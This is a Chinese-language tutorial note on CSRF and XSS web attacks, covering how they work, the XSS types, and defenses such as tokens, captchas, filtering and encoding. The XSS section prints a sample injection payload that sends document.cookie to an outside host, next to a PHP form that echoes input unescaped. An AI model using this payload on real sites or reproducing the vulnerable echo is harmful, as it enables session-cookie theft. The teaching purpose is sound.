# XSRF(或叫做CSRF)和XSS
CSRF(Cross-site request forgery)跨站请求伪造：通过伪装来自受信任用户的请求来利用受信任的网站。
XSS(Cross Site Scripting)跨站脚本攻击
CSRF重点在请求,XSS重点在脚本

CSRF：网站过分信任用户，放任来自所谓通过访问控制机制的代表合法用户的请求执行网站的某个特定功能。
XSS：用户过分信任网站，放任来自浏览器地址栏代表的那个网站代码在自己本地任意执行。如果没有浏览器的安全机制限制，xss代码可以在用户浏览器为所欲为

* ### CSRF
    + CSRF攻击原理
        1. 用户登录受信任网站A，浏览器保存了A的Cookie
        2. 用户在没有登出A网站的情况下，访问危险网站B
        3. B在用户不知情的情况下向第三方站点A发起一个请求R
        4. 因为A没有做防止CSRF的措施，A无法判断请求是用户发出的还是其他站点发出的。
        5. 浏览器会自动带上用户在A网站的Cookie，所以A网站会当做用户在发起请求R。

        + 总结
        CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！

    + CSRF的防御
    一般在服务端进行CSRF防御，效果也比较好(客户端也可以)
    服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数。
    （因为攻击者无法读取非同源站点的Cookie作为本次请求的参数，注意，是参数不是Cookie，浏览器还是会自动带上Cookie，服务器会验证参数和Cookie值是否相同）
        1. Cookie Hashing(所有表单都包含同一个伪随机值)：在表单里增加Hash值，以认证这确实是用户发送的请求。
        `<input type=”hidden” name=”hash” value=”<?=$hash;?>”>`
        2. One-Time Tokens(不同的表单包含一个不同的伪随机值，在页面上生成一个Token，发请求的时候把Token带上。处理请求的时候需要验证Cookies+Token。)
        3. 验证码：用户填写图片验证码，易用性不太好。


* ### XSS
    + 原理
        XSS本质是Html注入，和SQL注入差不多。
        XSS跨站攻击就是在网页里面埋入恶源代码，劫持用户的信息投递到预设的网站上去的一种黑客攻击手段。
        举个栗子：把网页比作一瓶液体，普通用户看来透明的应该可以喝，就直接喝了（访问），黑客XSS攻击者就相当于在水里投一种无色无味的毒药，你喝掉就被控制了，主动把身上的钱啊（cookie） 银行卡密码（存储的账号密码）啊都交了出来，甚至你自己还不知道。
        ```
        # 这里是一个表单输入框，正常应该输入一个地址，但是攻击者可能输入一段html代码，如：
        #   "/> <script>window.open("http://secquan.org/xss_hacker.php?cookie="+document.cookie);</script><!--
        <form>
        <input style="width:300px;" type="text" name="address1" value="<?php echo $_GET["address1"]; ?>" />
        <input type="submit" value="Submit" />  
        </form>

        # 于是，代码变为如下，目的是获取本机存储的该域名的cookie发送到另一个地址
        <form>
        <input style="width:300px;" type="text" name="address1" value=""/>
        <script>window.open("http://secquan.org/xss_hacker.php?cookie="+document.cookie);</script><!--" />
        <input type="submit" value="Submit" />  
        </form>
        ```
    + 类型
        + 反射型XSS，又称非持久型XSS：将恶意的脚本附加到URL地址的参数中，一般是将构造好的URL发给受害者，是受害者点击触发，而且只执行一次，非持久化。
        + 储存型XSS，也就是持久型XSS：攻击者事先讲恶意JavaScript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意的代码的页面就会执行恶意代码。

    + 防范手段
        + 过滤：对诸如<script\>、\<img\>、\<a\>等标签进行过滤。
        + 编码：像一些常见的符号，如<>在输入的时候要对其进行转换编码，这样做浏览器是不会对该标签进行解释执行的，同时也不影响显示效果。
        + 限制：xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御。
